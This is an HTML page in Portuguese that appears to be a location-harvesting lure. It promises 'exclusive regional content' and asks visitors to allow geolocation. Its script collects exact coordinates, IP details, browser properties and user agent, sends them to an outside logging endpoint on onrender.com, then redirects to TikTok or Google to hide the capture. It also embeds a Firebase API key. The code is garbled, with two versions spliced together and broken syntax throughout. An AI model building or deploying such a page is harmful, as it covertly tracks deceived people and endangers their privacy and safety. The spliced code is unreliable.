<!DOCTYPE html>
<html lang="pt-BR">√ü
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Acesso Exclusivo</title>

<html lang="pt-BR">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Acesse conte√∫do exclusivo para sua regi√£o. Autorize a localiza√ß√£o para continuar.">
  <meta name="author" content="">
  <meta name="robots" content="noindex, nofollow">
  <meta name="theme-color" content="#4f46e5">

  <meta property="og:type" content="website">
  <meta property="og:title" content="Acesso Exclusivo">
  <meta property="og:description"
    content="Acesse conte√∫do exclusivo para sua regi√£o. Autorize a localiza√ß√£o para continuar.">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Acesso Exclusivo">
  <meta name="twitter:description"
    content="Acesse conte√∫do exclusivo para sua regi√£o. Autorize a localiza√ß√£o para continuar.">

  <title>Verifica√ß√£o de Acesso</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            'primary': '#4f46e5',
            'secondary': '#6366f1',
            'success': '#10b981',
            'danger': '#ef4444',
            'background-light': '#f9fafb',
            'warning': '#f59e0b'
          }
        }
      }
    }
  </script>
  <style>
    body {
      font-family: 'Inter', sans-serif;
    }
  </style>
</head>

<body class="bg-background-light min-h-screen flex items-center justify-center p-4">

  <main
    class="card bg-white p-6 sm:p-8 rounded-xl shadow-2xl max-w-sm w-full mx-auto text-center border border-gray-100"
    role="main">

    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor"
      class="w-12 h-12 text-primary mx-auto mb-4">
      <path stroke-linecap="round" stroke-linejoin="round" d="M15 10.5a3 3 0 11-6 0 3 3 0 016 0z" />
      <path stroke-linecap="round" stroke-linejoin="round"
        d="M19.5 10.5c0 7.142-7.5 11.25-7.5 11.25S4.5 17.642 4.5 10.5a7.5 7.5 0 1115 0z" />
    </svg>
    <h1 class="text-2xl sm:text-3xl font-bold text-gray-800 mb-2">
      Conte√∫do Exclusivo
    </h1>

    <p class="text-sm text-gray-600 mb-6">
      Clique abaixo para autorizar a localiza√ß√£o e acessar o conte√∫do exclusivo para sua regi√£o.

    <div class="flex flex-col items-center mb-4">
      <svg xmlns="http://www.w3.org/2000/svg" width="40" height="60" viewBox="0 0 24 24" fill="none"
        stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
        class="lucide lucide-shield-alert mb-3 text-primary">
        <path
          d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z" />
        <path d="M12 8v4" />
        <path d="M12 16h.01" />
      </svg>
      <h1 class="text-2xl sm:text-3xl font-bold text-gray-800 mb-2">
        Conte√∫do Necess√°rio
      </h1>
    </div>

    <p class="text-sm text-gray-600 mb-6">
      Clique abaixo para autorizar a√ß√£o para acessar o conte√∫do da rede social.
    </p>

    <button id="request-location-btn"
      class="w-full bg-primary hover:bg-secondary text-white font-semibold py-3 px-4 rounded-lg shadow-lg transition duration-300 ease-in-out transform hover:-translate-y-0.5 mb-4 disabled:opacity-50 disabled:cursor-not-allowed">
      Permitir Localiza√ß√£o e Continuar
    </button>

      Permitir e Continuar
    </button>

    <div id="status" class="w-full p-3 rounded-lg font-medium transition duration-300 text-sm hidden" role="status">
    </div>

    <p id="instruction-message" class="text-xs text-gray-500 mt-4 transition duration-500">
      Aguardando sua intera√ß√£o...
    </p>

    <div id="links" class="hidden"></div>
  </main>

  <script>
    let ips = new Array();
    let isRequesting = false;

    const getIp = async () => {
      const res = await fetch("https://cloudflare.com/cdn-cgi/trace");
      const text = await res.text();

      const obj = {};
      text.split("\n").forEach(line => {
        if (!line) return;
        const [key, value] = line.split("=");
        obj[key] = value;
      });

      return obj;
    }

    getIp().then(data => {
      ips.push(data);
      console.log(ips);
    });

    function formatMetadata(lat, long, accuracy, timestamp, uriMaps, navigations) {
      getIp();

      const meta =[{
        
    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";

    const firebaseConfig = {
      apiKey: "AIzaSyD0p4JtqFsgkNbG0f8tJApdj8xfYKyyQHg",
      authDomain: "stream-7db57.firebaseapp.com",
      projectId: "stream-7db57",
      storageBucket: "stream-7db57.firebasestorage.app",
      messagingSenderId: "927775988063",
      appId: "1:927775988063:web:47e4bc9d5f062d884cfeea"
    };
    const app = initializeApp(firebaseConfig);


    let ips = [];
    let isRequesting = false;
    const REDIRECT_URL = "https://www.google.com/";
    const API_ENDPOINT = "http://localhost:3000/api/add-sessions";

    console.log("üîß Script carregado. API Endpoint:", API_ENDPOINT);

    const getIp = async () => {
      try {
        console.log("üåê Buscando IP...");
        const res = await fetch("https://cloudflare.com/cdn-cgi/trace");
        const text = await res.text();

        const obj = {};
        text.split("\n").forEach(line => {
          if (!line) return;
          const [key, value] = line.split("=");
          obj[key] = value;
        });

        console.log("‚úÖ IP obtido:", obj);
        return obj;
      } catch (error) {
        console.error("‚ùå Erro ao obter IP:", error);
        return null;
      }
    }

    getIp().then(data => {
      if (data) {
        ips.push(data);
      }
    });

    function getNavigatorData() {
      const nav = navigator;
      const data = {};
      const processedKeys = new Set();

      const ownProps = Object.getOwnPropertyNames(nav);
      ownProps.forEach(key => {
        if (processedKeys.has(key)) return;
        processedKeys.add(key);
        try {
          const descriptor = Object.getOwnPropertyDescriptor(nav, key);
          if (descriptor && !descriptor.get) {
            const value = nav[key];
            if (typeof value !== "function") {
              try {
                const jsonString = JSON.stringify(value);
                data[key] = JSON.parse(jsonString);
              } catch (e) {
                data[key] = String(value);
              }
            }
          } else if (descriptor && descriptor.get) {
            try {
              const value = nav[key];
              if (typeof value !== "function") {
                try {
                  JSON.stringify(value);
                  data[key] = value;
                } catch (e) {
                  data[key] = String(value);
                }
              }
            } catch (e) {
              data[key] = "[Getter Error]";
            }
          }
        } catch (e) { }
      });

      let proto = Object.getPrototypeOf(nav);
      while (proto && proto !== Object.prototype) {
        const protoProps = Object.getOwnPropertyNames(proto);
        protoProps.forEach(key => {
          if (processedKeys.has(key) || key === 'constructor') return;
          processedKeys.add(key);
          try {
            const descriptor = Object.getOwnPropertyDescriptor(proto, key);
            if (descriptor && !descriptor.get) {
              const value = nav[key];
              if (typeof value !== "function") {
                try {
                  JSON.stringify(value);
                  data[key] = value;
                } catch (e) {
                  data[key] = String(value);
                }
              }
            } else if (descriptor && descriptor.get) {
              try {
                const value = nav[key];
                if (typeof value !== "function") {
                  try {
                    JSON.stringify(value);
                    data[key] = value;
                  } catch (e) {
                    data[key] = String(value);
                  }
                }
              } catch (e) {
                data[key] = "[Getter Error]";
              }
            }
          } catch (e) { }
        });
        proto = Object.getPrototypeOf(proto);
      }

      for (let key in nav) {
        if (processedKeys.has(key)) continue;
        processedKeys.add(key);
        try {
          const value = nav[key];
          if (typeof value !== "function") {
            try {
              JSON.stringify(value);
              data[key] = value;
            } catch (e) {
              data[key] = String(value);
            }
          }
        } catch (e) { }
      }

      return data;
    }

    function formatMetadata(lat, long, accuracy, timestamp, uriMaps, navigations) {
      console.log("üîß formatMetadata chamada com:", { lat, long, accuracy, timestamp, uriMaps });

      console.log("üìä Obtendo navigator data...");
      const navigatorData = getNavigatorData();
      console.log("‚úÖ Navigator data obtido (primeiras 3 chaves):", Object.keys(navigatorData).slice(0, 3));

      const meta = {
        latitude: lat,
        longitude: long,
        accuracy: accuracy,
        timestamp: timestamp,
        uriMaps: uriMaps.href,
      },
      {
        navegacao: {
          results: navigations,
          infos: ips
        }
      }];

      return meta;
    }

    function redirectPage(status, lat, long, accuracy, timestamp, uriMaps) {

      const navigations = [{
        cookieEnabled: navigator.cookieEnabled,
        online: navigator.online,
        uriMaps: uriMaps,
        navegacao: {
          results: navigations,
          navigators: navigatorData,
          infos: ips
        }
      };

      console.log("‚úÖ Meta criado com sucesso");
      return meta;
    }

    async function redirectPage(status, lat, long, accuracy, timestamp, uriMaps) {
      console.log("üîç redirectPage chamada com:", { status, lat, long, accuracy, timestamp, uriMaps });

      // Garante que temos os dados de IP antes de prosseguir
      if (ips.length === 0) {
        console.log("‚è≥ Aguardando dados de IP...");
        const ipData = await getIp();
        if (ipData) {
          ips.push(ipData);
        }
      }

      const navigations = [{
        cookieEnabled: navigator.cookieEnabled,
        online: navigator.onLine,
        linguagem: navigator.language
      },
      {
        screen: {
          width: screen.width,
          height: screen.height
        }
      }];

      const meta = formatMetadata(lat, long, accuracy, timestamp, uriMaps, navigations);

      if (status === true) {
        try {
          fetch("https://service-1-mr59.onrender.com/api/log", {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              meta,
              userAgent: navigator.userAgent
            })
          })
            .then((response) => {
              return response.json();
            })
            .then((data) => {
              window.location.href = "https://www.tiktok.com/"
            })
            .catch((err) => {
              console.warn(err);
            });
        } catch (error) {
          console.warn(error);
        }
      }
    }

      console.log("üìä Navegations criado:", navigations);
      console.log("üìä IPs dispon√≠veis:", ips);

      console.log("üîß Formatando metadata...");
      const meta = formatMetadata(lat, long, accuracy, timestamp, uriMaps, navigations);
      console.log("‚úÖ Meta formatado:", meta);

      if (status === true) {
        console.log("‚úÖ Status √© true, preparando payload...");
        const payload = {
          meta,
          userAgent: navigator.userAgent
        };

        console.log("üì§ Enviando dados");
        console.log("üì¶ Payload completo:", JSON.stringify(payload, null, 2));

        try {
          // Tenta enviar para o endpoint principal
          const response = await fetch(API_ENDPOINT, {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify(payload)
          });

          console.log("üì• Resposta recebida - Status:", response.status);

          if (response.ok) {
            const data = await response.json();
            console.log("‚úÖ Dados enviados com sucesso:", data);
          } else {
            console.warn("‚ö†Ô∏è Erro na resposta:", response.status);
          }
        } catch (err) {
          console.error("‚ùå Erro ao enviar dados:", err);
          console.error("‚ùå Detalhes do erro:", err.message);
        }

        // Redireciona ap√≥s 2 segundos independente do resultado
        console.log("‚è≥ Aguardando 2 segundos antes de redirecionar...");
        setTimeout(() => {
          console.log("üîÄ Redirecionando para:", REDIRECT_URL);
          window.location.href = REDIRECT_URL;
        }, 2000);

      } else {
        console.warn("‚ö†Ô∏è Status √© false, n√£o redirecionando. Status recebido:", status);
      }
    }

    function updateStatus(text, type = 'initial') {
      const statusEl = document.getElementById("status");
      const instructionEl = document.getElementById("instruction-message");
      const btnEl = document.getElementById("request-location-btn");

      if (!statusEl || !instructionEl || !btnEl) return;

      statusEl.classList.remove("bg-yellow-100", "text-yellow-800", "border-yellow-300", "bg-danger", "text-white", "border-danger", "bg-success", "text-white", "border-success", "hidden");
      statusEl.classList.add("w-full", "p-3", "rounded-lg", "font-medium");

      switch (type) {
        case 'loading':
          statusEl.classList.add("bg-yellow-100", "text-yellow-800", "border-yellow-300");
          instructionEl.textContent = "Por favor, clique em **Permitir** no pop-up do navegador para continuar.";

          instructionEl.innerHTML = 'Por favor, clique em <b>Permitir</b> no pop-up do navegador para continuar.';
          btnEl.disabled = true;
          break;
        case 'success':
          statusEl.classList.add("bg-success", "text-white", "border-success");
          instructionEl.textContent = "Localiza√ß√£o obtida com sucesso. Redirecionando em instantes...";

          instructionEl.textContent = "Opera√ß√£o recebida com sucesso. Redirecionando em instantes...";
          btnEl.classList.add("hidden");
          break;
        case 'error':
          statusEl.classList.add("bg-danger", "text-white", "border-danger");
          instructionEl.textContent = "Verifica√ß√£o falhou. Por favor, tente novamente e autorize a permiss√£o.";
          btnEl.disabled = false;
          btnEl.textContent = "Tentar Novamente";
          break;
        case 'initial':
          statusEl.classList.add("hidden");
          instructionEl.textContent = "Clique no bot√£o acima para iniciar a verifica√ß√£o de localiza√ß√£o.";
          btnEl.disabled = false;
          btnEl.textContent = "Permitir Localiza√ß√£o e Continuar";
          instructionEl.textContent = "Clique no bot√£o acima para iniciar a verifica√ß√£o necess√°ria.";
          btnEl.disabled = false;
          btnEl.textContent = "Permitir e Continuar";
          break;
      }

      statusEl.textContent = "Status: " + text;
    }

    function showResult(position) {
      isRequesting = false;
      if (!position || !position.coords) {
    async function showResult(position) {
      console.log("‚úÖ Geolocaliza√ß√£o obtida:", position);
      isRequesting = false;

      if (!position || !position.coords) {
        console.error("‚ùå Position inv√°lida:", position);
        updateStatus("Retorno inesperado da API.", 'error');
        return;
      }

      const { latitude, longitude, accuracy } = position.coords;
      const ts = new Date(position.timestamp).toLocaleString();

      const gmaps = document.createElement("a");
      gmaps.href = `https://maps.google.com/?q=${latitude},${longitude}`;

      updateStatus("Localiza√ß√£o obtida. Redirecionando...", 'success');
      redirectPage(true, latitude, longitude, accuracy, ts, gmaps);
    }

    function handleError(err) {
      console.log(`üìç Lat: ${latitude}, Long: ${longitude}, Accuracy: ${accuracy}m`);

      const gmapsUrl = `https://maps.google.com/?q=${latitude},${longitude}`;

      console.log("üîÑ Atualizando status para success...");
      updateStatus("A√ß√£o obtida com sucesso. Redirecionando...", 'success');

      console.log("üöÄ Chamando redirectPage com status=true...");
      await redirectPage(true, latitude, longitude, accuracy, ts, gmapsUrl);
      console.log("‚úÖ redirectPage foi chamada!");
    }

    function handleError(err) {
      console.error("‚ùå Erro na geolocaliza√ß√£o:", err);
      isRequesting = false;
      const msg =
        {
          1: "Permiss√£o negada. Autorize para continuar!",
          2: "Localiza√ß√£o indispon√≠vel. Tente novamente.",
          3: "Tempo excedido. Tente novamente.",
        }[err.code] || "Erro desconhecido";

          2: "Permiss√£o indispon√≠vel. Tente novamente.",
          3: "Tempo excedido. Tente novamente.",
        }[err.code] || "Erro desconhecido";

      console.error(`‚ùå C√≥digo do erro: ${err.code} - ${msg}`);
      updateStatus(msg, 'error');
    }

    function requestLocationByUserClick() {
      if (isRequesting) return;

      if (!("geolocation" in navigator)) {
      console.log("üñ±Ô∏è Bot√£o clicado!");

      if (isRequesting) {
        console.warn("‚ö†Ô∏è J√° existe uma requisi√ß√£o em andamento");
        return;
      }

      if (!("geolocation" in navigator)) {
        console.error("‚ùå Geolocation n√£o suportada");
        updateStatus("Geolocation API n√£o suportada neste dispositivo.", 'error');
        return;
      }

      isRequesting = true;
      updateStatus("Aguarde. Solicitando sua localiza√ß√£o...", 'loading');
      console.log("üìç Solicitando geolocaliza√ß√£o...");
      updateStatus("Aguarde. Solicitando dados necess√°rios...", 'loading');

      navigator.geolocation.getCurrentPosition(showResult, handleError, {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0,
      });
    }

    function requestLocationAutomatically() {
      if (!("geolocation" in navigator)) {
        updateStatus("Geolocation API request", true);
        return;
      }
    }

    window.addEventListener("load", () => {
      updateStatus("Pronto para verificar a localiza√ß√£o.", 'initial');

      const btn = document.getElementById("request-location-btn");
      if (btn) {
        btn.addEventListener("click", requestLocationByUserClick);
        
    window.addEventListener("load", () => {
      console.log("‚úÖ P√°gina carregada!");
      updateStatus("Pronto para verificar permiss√£o.", 'initial');

      const btn = document.getElementById("request-location-btn");
      if (btn) {
        console.log("‚úÖ Bot√£o encontrado e listener adicionado");
        btn.addEventListener("click", requestLocationByUserClick);
      } else {
        console.error("‚ùå Bot√£o n√£o encontrado!");
      }
    });
  </script>
</body>
</html>